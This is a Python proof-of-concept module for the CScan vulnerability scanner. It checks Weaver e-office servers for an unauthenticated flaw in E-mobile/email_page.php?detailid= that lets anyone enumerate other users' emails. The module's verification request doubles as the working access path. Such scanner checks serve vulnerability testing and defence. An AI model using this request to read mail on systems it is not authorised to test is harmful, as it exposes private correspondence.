# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    poc_id = 'bfb8e5d4-ef65-4bd2-9850-bc35df235e7f'
    name = '泛微e-office 越权遍历'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.INFO_LEAK # 漏洞类型
    disclosure_date = '2015-07-22'  # 漏洞公布时间
    desc = '''
        泛微 e-office 信息泄露：
        E-mobile/email_page.php?detailid=*** 可以遍历任意邮件
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = '泛微OA'  # 漏洞应用名称
    product_version = '泛微e-office'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'ece3b043-7ae6-403a-8260-d91933e4986f'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-26'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #refer: http://www.wooyun.org/bugs/wooyun-2010-0127270
            hh = hackhttp.hackhttp()
            arg = self.target
            url = arg + '/E-mobile/email_page.php?detailid=1'
            code, head, res, err, _ = hh.http(url)

            if code == 200 and 'type="hidden" id="email_from" name="email_from"' in res:
                #security_info('info disclosure: ' + url)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
